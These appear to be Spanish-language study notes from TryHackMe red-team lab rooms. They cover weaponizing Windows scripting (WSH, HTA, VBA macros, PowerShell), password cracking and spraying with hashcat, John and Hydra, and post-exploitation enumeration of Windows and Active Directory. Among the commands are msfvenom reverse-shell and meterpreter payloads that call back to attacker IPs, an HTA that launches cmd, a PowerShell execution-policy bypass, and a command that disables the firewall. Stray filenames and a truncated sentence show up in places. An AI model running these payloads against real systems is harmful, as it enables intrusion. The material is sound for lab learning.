En este etapa, el atacante genera o desarrolla su propio código malicioso basado en sus propias habilidades y la información que ha podido recopilar del objetivo. Esta etapa está en definitiva orientada a la creación de malware específico para explotar y ganar un acceso inicial a la máquina.

La mayoría de las organizaciones bloquean o supervisan la ejecución de  archivos .exe dentro de su entorno controlado. Por ese motivo, los miembros del equipo rojo confían en la ejecución de cargas útiles mediante otras técnicas, como las tecnologías de secuencias de comandos de Windows integradas. Por lo tanto, esta tarea se enfoca en varias técnicas de secuencias de comandos populares y efectivas, que incluyen:

- The Windows Script Host (WSH)
- An HTML Application (HTA)
- Visual Basic Applications (VBA)
- PowerShell (PSH)

<br />

**Windows Scripintg Host (WSH)**

*Windows Scripting Host* es una herramienta interna (built-in) de Windows que permite la ejecución de ficheros [batch](https://en.wikibooks.org/wiki/Windows_Batch_Scripting) para automatizar tareas dentro del sistema operativo.

Este está compuesto de dos binarios:

- *cscript.exe*: Responsable de la ejecución de scripts de línea de comandos.
- *wscript.exe*: Responsable de la ejecución de UI scripts y VBScript.

Construyamos un script que muestre un mensaje por pantalla:

```javascript
Dim message
message = "Welcome to THM"
MsgBox message
```

En principio, guardaríamos el contenido anterior en un fichero creado con el bloc de notas y lo guardaríamos con extensión ".vbs":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920163024.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920163059.png' | relative_url }}" text-align="center"/>
</div>

Y por último, ejecutamos pasándo el archivo como parámetro al comando *wscript*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920163212.png' | relative_url }}" text-align="center"/>
</div>

La potencia de este motor de scripts es que con él podemos correr ejecutables. Por ejemplo, podemos invokar la calculadora de Windows mediante el siguiente script:

```javascript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

De nuevo, metemos el código en el bloc de notas, lo guardamos con la extensión .vbs y lo ejecutamos pasándolo como parámetro al comando wscript:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920163840.png' | relative_url }}" text-align="center"/>
</div>

También podemos ejecutar ficheros sin extensión .vbs mediante el comando:

```javascript
wscript /e:VBScript file.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920165250.png' | relative_url }}" text-align="center"/>
</div>

<br />

**An HTML Application (HTA)**

- *Basic HTA Example*: El término HTA atiende a *HTML Application* y es un tipo de documento HTML que puede ser descargado y ejecutado por el binario *mshta.exe* permitiendo la inyección de código en el sistema operativo. Se trata esencialmente de un script corrido por Windows a través de [mshta.exe](https://www.file.net/process/mshta.exe.html) que muy resumidamente se trata de un componente de Internet Explorer. Puede ejecutar aplicaciones HTML en Windows haciendo doble clic en los archivos HTA. Después de hacer doble clic en un archivo HTA, Windows abre la aplicación en Internet Explorer y ejecuta el código incrustado.

Así, supongámos que tenemos el siguiente código HTML:

```HTML
<html>
<body>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

Este código emplea un ActiveXObject para ejecutar un cmd.exe guardamos el código en un fichero al que llamamos *cmd.hta*.

Seguidamente, abrimos un servidot HTTP en la máquina local y accedemos a ella desde la máquina víctima y descargamos el fichero cmd.hta:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920173252.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920173410.png' | relative_url }}" text-align="center"/>
</div>

Y al darle a Run, ejecutamos el código del HTML Application obteniendo una CMD:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920173553.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *HTA Reverse Connection*: Este mismo procedimiento se puede utilizar pero en lugar de utilizar el código anterior podemos crear un payload con MSFVenom.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```

Y abrir de nuevo un servidor HTTP y un listener de Netcat para al ejecutar desde la máquina victima el THA capturar la conexión y abrir una shell en la máquina local.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920175046.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Malicious HTA via Metasploit*:

También podemos utilizar con Metasploit el módulo "exploit/windows/misc/hta_server" este fabrica él mismo un HTA y proporciona un link que la victima debe visitar.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920175556.png' | relative_url }}" text-align="center"/>
</div>

Una vez visitado, Metasploit captura la conexión con un listener habilitado previamente dando una shell al atacante:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920175613.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Visual Basic for Application - VBA**

VBA o Visual Basic for Application es un lenguaje de programación creado por Microsoft para las aplicaciones de Microsoft como Word, Excel, etc permitiendo automatizar tareas de casi todas las interacciones del teclado y el mouse entre un usuario y las aplicaciones de Microsoft Office. Las aplicaciones que contienen embebido código VBA se denominan *Macros*.

Vamos a ver cómo, desde la perspectiva de un atacante, podemos aprovecharnos de los Macros para generar documentos maliciosos.

Supongámos que tenemos Word 2016 y abrimos un documento en blanco, acudimos a View > Macros > View Macros para abrir un macro:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920211546.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, damos un nombre a nuestro macro y en el apartado "macros in" seleccionamos Document1 y lo creamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920212852.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920215400.png' | relative_url }}" text-align="center"/>
</div>

Así, empleamos como prueba de concepto el siguiente código para mostrar un mensaje por pantalla:

```javascript
Sub THM()
MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Ejecutamos con F5

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920215941.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, podemos hacer algo más sofisticado con MsfVenom. Ahora vamos a crear un payload meterpreter en memoria utilizando el marco Metasploit para recibir una reverse shell. Primero, desde AttackBox, creamos nuestr payload meterpreter usando msfvenom. 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
```

se debe realizar una modificación para que esto funcione. La salida estará trabajando en una hoja de Excel de MS. Por lo tanto, cambie *Workbook_Open()* a *Document_Open()* para que sea adecuado para documentos de MS Word.

Así, copiamos el output del comando y lo guardamos como Macros y antes de ejecutarlo preparamos un listener para recibir la conexión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220920220621.png' | relative_url }}" text-align="center"/>
</div>

<br />

**PowerShell - PSH**

PowerShell es un lenguaje de programación orientado a objetos que se ejecuta desde Dynamic Language Runtime. Con PowerShell existen una gran variedad de opciones para un atacante que se han cubierto en el path 1.Scripting for Pentesters. Aquí sin embargo queremos tratar medidas de seguridad que Windows tiene para prevenir la ejecución maliciosa de PowerShell:

- *Execution Policy*: La Execution Policy es una opción de seguridad que protege al sistema de la ejecución de scripts maliciosos, de esta forma y por defecto, Microsoft deshabilita la ejecución de scripts de PowerShell (.ps1) por propósitos de seguridad.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921104520.png' | relative_url }}" text-align="center"/>
</div>

Aunque sin embargo, podemos deshabilitar la execution policy de la siguiente manera:

```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921104622.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Bypass Execution Policy*: Microsoft provee de un modo de deshabilitar esta restricción. Por ejemplo desde una CMD podemos ejecutar el comando Powershell con el modificador -ex bypass para ejecutar un fichero:

```cmd
powershell -ex bypass -File thm.ps1
```

<br />

#### 2.3. Password Attacks.

7.BufferOverflowIntroduction.md

Este room es una introducción a los tipos de técnicas empleados en los ataques de contraseñas. Entre las técnicas que discutiremos se encuentran:

- Password profiling
- Password attacks techniques
- Online password attacks

<br />

**Password Cracking vs Password Guessing**

Por un lado, el Cracking de contraseñas es una técnica para descubrir una contraseña de un usuario a partir de una serie de datos que generalmente consisten en fragmentos cifrados de la misma contraseña (hash) o la propia contraseña cifrada (encrypted password) en un entorno local con la finalidad de acceder a un sistema operativo con una cuenta concreta para elevar privielgios o similar.

Por otro lado, el Password Guessing refiere a algo más genérico que tiene que ver con adivinar una contraseña en el logeo de un servicio (como un servicio web) a partir de un ataque de diccionario (lista de candidatos a posible contraseña).

<br />

**Password Profiling #1 (List of candidates)**

Los ataques sobre contraseñas se hacen sobre lo que se denomina como una lista de candidatos. Es importante por tanto cómo generar adecuadamente esta lista. Con este fin tenemos en cuenta los siguientes puntos:

- *Defaults Passwords*: Cuando intentamos acceder a un servicio como MySQL, FTP, SMB etc, existen cuentas creadas por defecto en la instalación del servicio que a su vez tienen contienen contraseñas por defecto. De forma que tiene sentido probar con estas credenciales por defecto antes de pasar a metodologías más sofisticadas.

- [https://cirt.net/passwords](https://cirt.net/passwords)
- [](https://default-password.info/)[https://default-password.info/](https://default-password.info/)
- [](https://datarecovery.com/rd/default-passwords/)[https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

- *Weak Passwords*: Listas de contraseñas débiles que pueden ser candidatos a contraseña en personas poco formadas en ciberseguridad:

- [https://wiki.skullsecurity.org/index.php?title=Contraseñas](https://wiki.skullsecurity.org/index.php?title=Passwords)[](https://wiki.skullsecurity.org/index.php?title=Passwords) - Esto incluye las colecciones de contraseñas más conocidas.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)  : una gran colección de todo tipo de listas, no solo para descifrar contraseñas.

- *Leaked Passowrds*: También encontramos casos en los que de un determinado servicio/aplicación se ha producido una brecha de seguridad y se han filtrado una gran cantidad de credenciales como es el caso de la lista rockyou.txt.

- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

Así, una vez tenemos en cuenta estos puntos, en función del contexto podemos generar una lista de contraseñas personalizada teniendo los nombres y empleando los comandos *sort* o *cewl*.

<br />

**Password Profiling #2 (Personal Candidates)**

Por último, si tenemos un usuario localizado y conocemos datos personales del mismo podemos empelar herramientas como las siguientes para generar nuestros propios candidatos a contraseñas.

- [username_generator](https://github.com/therodri2/username_generator.git)
- [Crunch](https://www.kali.org/tools/crunch/)
- [Cupp](https://en.kali.tools/?p=1305)

<br />

**Offline Attacks (Dictionay and Brute-Force)**

Una vez tenemos una lista de candidatos podemos comenzar a plantear metodologías ofensivas:

*Dictionary Attack*: Un *ataque de diccionario* es una técnica utilizada tanto para el Cracking como el Guessing de contraseñas mediante el uso de palabras o frases conocidas. El ataque de diccionario se basa completamente en listas de palabras recopiladas previamente que se generaron o encontraron. Es importante elegir o crear la mejor lista de palabras candidatas para su objetivo para tener éxito en este ataque. Por ejemplo, si tenemos un hash de una contraseña y tenemos una lista de candidatos podemos emplear herramientas como *Hashcat* para crackear la misma:

En primer lugar, identificamos el tipo de formato del hash en el que está hasheada la contraseña con *Hash-identifier*. Esta herramienta te da el formato de hash más probable.

Una vez tenemos el formato de hash y una lista de candidatos, Hashcat coge cada candidato, saca de este el hash en el formato indicado y lo compara con el hash a crackear, de forma que cuando obtiene un match con los hashes devuelve el candidato asocaido al match:

```bash
hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
```

En el comando utilizado empleamos:

- *a 0*:  setea el tipo de ataque a dictionary attack

- *m 0*:  setea el formato de hash a MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

- *f806fc5a2a0d5ba2471600758452799c*: this option could be a single hash like our example or a file that contains a hash or multiple hashes.

- */usr/share/wordlists/rockyou.txt*: the wordlist/dictionary file for our attack.

Para ver el resultado acompañamos al comando anterior del parámetro --show:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921171035.png' | relative_url }}" text-align="center"/>
</div>

El valor del candidato es rockyou.

<br />

*Brute-Force attack*: Por otro lado, tenemos el ataque de fuerza bruta que consiste con probar con una combinación de una serie de caracteres, por ejemplo, todas las posibles variaciones de los números de cuatro cifras.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921172746.png' | relative_url }}" text-align="center"/>
</div>

- *a 3:  sets the attacking mode as a brute-force attack

- *?d?d?d?d* the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

- *--stdout* print the result to the terminal

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921172841.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Offline Attacks - Rule-Based**

Los *Rule-Based* attacks también conocidos como Hybrids Attacks son ataques en los que se asume que el atacante posee cierto conocimiento acerca de cómo deben ser la contraseña que desea adivinar/crakear y que puede explicitar ese conocimiento en términos de reglas. Podemos por tanto enunciar esas reglas en la nomenclatura de herramientas como Hashcat o JohnTheRipper para encajar candidatos dentro de unas características específicas.

Veámos un ejemplo con JohnTheRipper. Este tiene en el fichero /etc/john/john.conf una sección de *List.Rules*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921181641.png' | relative_url }}" text-align="center"/>
</div>

Podemos invocar estas reglas para extender una wordlists dada con por ejemplo sl siguiente comando:

```bash
john --wordlist=/tmp/single-password-list.txt --rules=<Rule to Invoke> --stdout
```

Este coge una lista de un candidato y le aplica la regla best64 obteniendo 76 variantes de la contraseña dada. También podemos, conociento la sintaxis del fichero John.conf generar Custom Rules, reglas creadas a medida.

<br />

**Online Passwords Attacks - Hydra. Password Spray.**

Hydra es una herramienta para realizar ataques de diccionario sobre servicios de autenticación de red como HTTP, FTP, SMB, MySQL, etc. Puede realizar múltiples peticiones en batería en diversos protocolos de red.:

- *FTP*:

```bash
hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

- Con -l especificamos un single username, use -L for a username wordlist.

- -P Path specifying the full path of wordlist, you can specify a single password by using -p.

- ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target

- *SMTP*:

```bash
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

- Con -v especificamos el verbose:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921182448.png' | relative_url }}" text-align="center"/>
</div>

- *SSH*:

```bash
hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

<br />

- *HTTP*: Para el protocolo HTTP las cosas se tornan levemente distintas pues Hydra necesita primero que le especifique el método HTTP utilizado en la petición: GET o POST, esto dependerá si la solicitud se emite en modo GET o modo POST. Un ejemplo sería:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921182906.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, un desarrollo completo puede encontrarse o bien en las partes de fuerza bruta o aplicaciones web de otros paths o en este [enlace](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

<br />

- *RDP*: Para el protocolo RDP propio de Windows empleamos la herramienta: [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) para realizar un *password spray* contra RDP. Esta es una técnica eficaz que se utiliza para identificar credenciales válidas. Este se dirige a muchos nombres de usuario que usan una contraseña débil común, lo que podría ayudar a evitar una política de bloqueo de cuenta:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921183405.png' | relative_url }}" text-align="center"/>
</div>

Como se puede ver en la imágen, se utiliza la misma contraseña con múltiples usuarios para evitar la política de bloqueo de contraseñas contra ataques de brute forcing. Un ejemplo de uso sería el siguiente:

```bash
python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

Notemos que este tipo de ataques también se pueden desarollar con Hydra en cualquier otro servicio de la capa de aplicación simplemente pasándo una contraseña con el parámetro *-p* y una lsita de nombres de usuario con *-L* realizando requests de diversos usuarios con la misma contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220921183618.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 3. Post Compromise.
#### 3.1. The Lay of the land (Windows Security Fundamentals).

7.BufferOverflowIntroduction.md

En este room vamos a hacer una introducción a las tecnologías que podemos encontrar en un sistema Windows. Esto involucra:

- Network infrastrucutre
- Active Directory Environment
- Users and Groups
- Host-based security solutions
- Network-based security solutions
- Applications and services

<br />

**Network Infraestructure. Network Enumeration.**

Una vez tomamos control de una máquina nos adentramos en una red nueva y nuestro primer objetivo en dicho contexto es identificar la estructura de la red y nuestras posibilidades dentro de ella. Ahora veremos los componentes o tipos de redes más frecuentes que podemos encontrarnos durante un engagement:

- *Network Segment*: La *Network Segmentation* o separación de la red en segmentos es una capa de seguridad extra en la que la red se divide en secciones denominadas *subredes* cuyas relaciones están reguladas mediante reglas, permisos y autenticaciones haciendo más dificil virar de un lado de la red a otro.

- *Virtual Local Area Network*: Dentro del contexto de una segmentación de red podemos encontrarnos las LANs virtuales las cuales son redes virtuales todavía más cerrada que un segmento de red convencional. Sólo se puede interactuar con una VLAN estando dentro de la VLAN.

- *Internal Networks*: Se tratan de segmentos de red dentro de una red corporativa que tiene una funcionalidad específica dentro de su conjunto.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922103820.png' | relative_url }}" text-align="center"/>
</div>

- *A Demilitarized Zone (DMZ)*: Un DMZ es una internal network que añade una capa de seguridad extra a una red corporativa. Comúnmente está se encuentra entre la red pública (internet) y

<br />

Por otra parte, tenemos herramientas de enumeración de red para examinar la propia máquina como: netstat, arp, etc.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922163028.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Active Directory (AD) Enviroment**

Algo frecuente en redes corporativas que tienen como base sistemas Windows son los elementos propios del entorno de Active Directory.

Active Directory es un servicio de directorios que provee un servicio de almacenamiento y acceso de objetos (datos) a elementos de la red de Windows. Permite esencialmente una gestión centralizada basada en la autenticación y autorización desde un Domain Controller para realizar acciones que requieran utilizar un determinado servicio. El controlador de AD se coloca en una subred para servidores y luego los clientes de AD están en una red separada donde pueden unirse al dominio y usar los servicios de AD a través del firewall:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922163444.png' | relative_url }}" text-align="center"/>
</div>

De entre los elementos de Active Directory, será necesario estar familizarizado con los siguientes:

- *Domain Controllers*: Se trata de un servidor Windows que proporciona el servicio Active Directory, es el cotnrolador central que gestiona el almacenamiento y acceso de objetos (archivos, usuarios, etc) de una sección de la red denominada como Dominio.

- *Organizational Units*: Son unidades que el DC entiende como contenedores de objetos que separa en distintas categorías para la adecuada gestión de los objetos.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922164157.png' | relative_url }}" text-align="center"/>
</div>

- *AD objects*: Cualquier cosa que Windows a su vez entienda que es un objeto, como usuarios, componentes de hardware, ficheros, etc.
- *AD Domains*: Conjuntos de objetos organizados jerárquicamente en unidades que se gestionan desde un servidor de forma centralizada denominado como Controlador de Dominios.
- *Forest*: Un bosque es una colección de árboles que son agrupaciones jerárquicas de dominios, es en esencia una estructuración de una gran red dividida en subredes. Estos árboles interaccionan entre sí en lo que se denominan *relaciones de confianza* que están definidas de acuerdo a una serie de reglas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922165018.png' | relative_url }}" text-align="center"/>
</div>

- AD Service Accounts: Built-in local users, Domain users, Managed service accounts
- Domain Administrators

<br />

Podemos emplear el comando *systeminfo* para saber si una máquina Windows está ligada a una entorno de Active Directory:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922170904.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922171047.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Users and Groups Management**

Si nos encontramos en una red de Active Directory es esencial hacer una enumeración adecuada de usuarios de la máquina comprometida, un *Account Discovery*.

Un entorno de Active Directory contiene varias cuentas con los permisos, accesos y roles necesarios para diferentes propósitos. Las cuentas de servicio comunes de Active Directory incluyen cuentas de usuario locales integradas, cuentas de usuario de dominio, cuentas de servicio administradas y cuentas virtuales. 

- *Built-In Local Users*: Utilizadas para administrar el sistema localmente. No forma parte del entorno de AD.
- *Domain user accounts*: Cuentas con acceso limitado a un entorno de AD.
- *Service Accounts*: Son domain users accounts con mayores privilegios para administrar los servicios de AD.
- *Domain Administrators*: Los administradores de dominio son cuentas de usuario que pueden administrar información en un entorno de Active Directory, incluidas configuraciones de AD, usuarios, grupos, permisos, roles, servicios, etc. Uno de los objetivos de un atacante consiste en buscar información que conduzca a un administrador de dominio para así tener un control completo sobre el entorno de AD. Entre estas podemos encontrar:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922174518.png' | relative_url }}" text-align="center"/>
</div>

Para proceder con una enumeración de usuarios en un entorno AD podemos emplear el siguiente comando en PowerShell: Get-ADUser -Filter \*

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922174711.png' | relative_url }}" text-align="center"/>
</div>

También podemos utilizar [LDAP hierarchical tree structure](http://www.ietf.org/rfc/rfc2253.txt) para encontrar usuarios dentro del entorno de Active Directory. El *Distinguished Name* (DN) es una colección de keys y valores empleados para obtener registros únicos dentro de un directorio, estos son en *Domain Component* (DC), *OrganizationalUnitName* (OU), *Common Name* (CN). Así, podemos emplear el siguiente comando:

```powershell
Get-ADUser -Filter 0.Pre-Security(TryHackMe).md 1. Scripting for Pentesters..md 2022-10-22-4.Windows.md 2022-10-30-5.RedTeam.md 2.Complete Beginer.(TryHackMe).md 4.Windows.md 5.RedTeam.md 6.OffensivePentesting.md 7.BufferOverflowIntroduction.md scriptApuntes.sh -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220922175157.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Host and Network Security Solution**

Las *Host Security Solution* son medidas de seguridad implementadas en el host comprometido que debemos superar si queremos tomar control de un sistema o red comprometido. Entre estas se encuentran:

1. Antivirus software.
2. Microsoft Windows Defender.
3. Host-based Firewall.
4. Security Event Logging and Monitoring.
5. Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS).
6. Endpoint Detection and Response (EDR).

<br />

- *Antivirus Software*: El antivirus, también conocido como antimalware es un software empleado para la monitorización, detección, y prevención de software malicioso de ser ejecutado en un host en tiempo real o con escáneres programados. Un antivirus utiliza alguna de estos tres tipos de escáneres:

- *Signature-based detection*: Analiza la firma de un archivo y la envía a una base de datos que contiene firmas de archivos maliciosos. Si existe un "match" cataloga el fichero como malware.
- *Heuristic-based detection*: Analiza estáticamente el fichero para buscar patrones que podrían indicar maliciosidad por parte del archivo y si los encuentra cataloga el mismo como malware.
- *Behavior-based detection*: Examinación de las aplicaciones en ejecución para buscar patrones maliciosos.

Como Red Teamer nos interesa saber si hay algún antivirus en el sistema, cosa qeu pdoemos averiguar con los siguientes comandos:

```powershell
wmic /namespace:\\root\securitycenter2 path antivirusproduct
```

O:

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923140638.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Windows Defender*: Microsoft Windows Defender es un antivirus/herramienta de seguridad pre instalada en los sistemas windows que trabaja en tres modos de protección distintos:

- *Active*: Es utilizado cuando MS Defender corre como el antivirus principal.
- *Pasive*: Cuando existe un software de 3eros actuándo como el antivirus principal.
- *Disabled*: Cuando MS Defender está deshabilitado o desintalado.

Podemos checkear el estado de Windows Defender con el siguiente comando:

```powershell
Get-Service WinDefend
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923142622.png' | relative_url }}" text-align="center"/>
</div>

<br />

```powershell
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923142642.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Host-based Firewall*: Se trata de una herramienta instalada por defecto en los sistemas windows que bloquea posibles tentativas de ataque al sistema. El propósito principal de este firewall es controlar el tráfico entrante y saliente que pasa por la interfaz del dispositivo mediante reglas. Protege al host de dispositivos no confiables que están en la misma red. Un cortafuegos moderno que utiliza múltiples niveles de análisis de tráfico, incluido el análisis de paquetes, mientras establece la conexión.

Si tenemos permisos de administrador podemos intentar deshabilitar con el cmdlet "Set-NetFirewallProfile", por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923143243.png' | relative_url }}" text-align="center"/>
</div>

```powershell
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
```

Podemos checkear las reglas del firewall que están activas:

```powershell
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

<br />

- *Security Event Logging and Monitoring*: De manera predeterminada, los sistemas operativos registran varios eventos de actividad en el sistema mediante archivos de registro (logs). El registro de eventos está disponible para los administradores de red para monitorear y analizar eventos importantes, ya sea en el host o en la red. 

Hay varias categorías en las que el sistema operativo Windows registra la información de eventos, incluida la aplicación, el sistema, la seguridad, los servicios, etc. Además, los dispositivos de seguridad y de red almacenan información de eventos en logs para permitir que los administradores del sistema obtengan una idea de lo que está sucediendo en el sistema.

Podemos obtener una lista de los logs diponibles con el cmdlet *Get-EventLog*:

```powershell
Get-EventLog -List
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923210024.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *System Monitor (Sysmon)*: Se trata de una *non essential tool* (no instalada por defecto) que empieza a recolectar y registrar eventos una vez instalada. Una de las grandes características de esta herramienta consiste en que podemos filtrar eventos registrados mediante reglas.

Para saber si tenemos esta herramienta habilitada intentamos verificar si existe un proceso denominado Sysmon entre los procesos que se ejecutan en el sistema:

```powershell
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

<br />

```powershell
Get-CimInstance win32_service -Filter "Description = 'System Monitor service'" # or Get-Service | where-object {$_.DisplayName -like "*sysm*"}
```

<br />

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
```

<br />

- *Host-based Intrusion Detection/Prevention System (HIDS/HIPS)*: Este es un software que tiene la capacidad de monitorear y detectar actividad anormal en un host. Observemos que como caracerística secundaria puede además prevenir, una vez detectada, esta actividad anormal, pero no es su principal función.

<br />

- *Endpoint Detection and Response (EDR)*: El EDR es herramienta cuyo propósito consiste en defender contra el malware y otras amenazas. Los EDR pueden buscar archivos maliciosos, monitorear eventos de endpoints, sistemas y redes, y registrarlos en una base de datos para su posterior análisis, detección e investigación. Los EDR son la próxima generación de antivirus y detectan actividades maliciosas en el host en tiempo real.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923213815.png' | relative_url }}" text-align="center"/>
</div>

<br />

Por otro lado, entre las herramientas de seguridad que podemos encontrarnos en una red se encuentran:

- *Firewall*: Cortafuegos de Red.
- *SIEM*: Es el acrónimo de Security Information and Even Management y es una tecnología que realiza una detección de malware y registro de eventos e una red basado en reglas.
- *IDS & IPS*: Atienden a Intrusion Detection/Prevention System y son un tipo de software Detecta o Previene malware en la red también basado en reglas.

<br />

**Applications and Services**

En esta última sección vamos a explorar cómo podemos concer en el sistema comprometido:

- *Aplicaciones Instaladas*: Podemos utilizar el cmdlet *wmic* para ver las aplicaiones que tenemos instaladas con le objetivo de encontrar alguna aplicación que pueda llevarnos a algún tipo de vulnearbilidad ed la que podamos sacar provecho:

```powershell
wmic product get name,version
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220923220013.png' | relative_url }}" text-align="center"/>
</div>

También podemos obtener elementos de interés con el cmdlet Get-ChildItem como sigue:

```bash
Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
```

<br />

#### 3.2. Enumeration.

7.BufferOverflowIntroduction.md

Ahora vamos a cubrir un aspecto fundamental de la etapa de post-explotación de una máquina (esto nos sitúa en la etapa inmediatamente posterior al de explotación en el que hemos ganado acceso a una máquina), en algunos casos incluso llegaremos a asumir que hemos ganado privilegios de adminstrador o root.

El objetivo de la enumeración en una etapa de post-explotación es recopilar la máxima información posible del objetivo para encontrar vetores de ataque ya sea para elevar privilegios o para lanzar ataques a otros dispositivos de la propia red. En este punto se asume que el atacante tiene acceso a una interfaz de línea de comandos o algún método de inyección de código dentro del sistema.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220924125025.png' | relative_url }}" text-align="center"/>
</div>

Parte de la información que nos interesa recopilar incluye:

- Usuarios y grupos
- nombres de host
- Tablas de enrutamiento
- recursos compartidos de red
- Servicios de red
- Aplicaciones y pancartas
- Configuraciones de cortafuegos
- Ajustes de servicio y configuraciones de auditoría
- Detalles de SNMP y DNS
- Búsqueda de credenciales (guardadas en navegadores web o aplicaciones cliente)
- SSH Private Key

Distinguimos entre enumeración para Linux y para Windows.

<br />

**Linux Enumeration**

La información que podemos obtener de un sistema se dividen cuatro categorias: System, Users, Networking y Running Services.

- *System*:
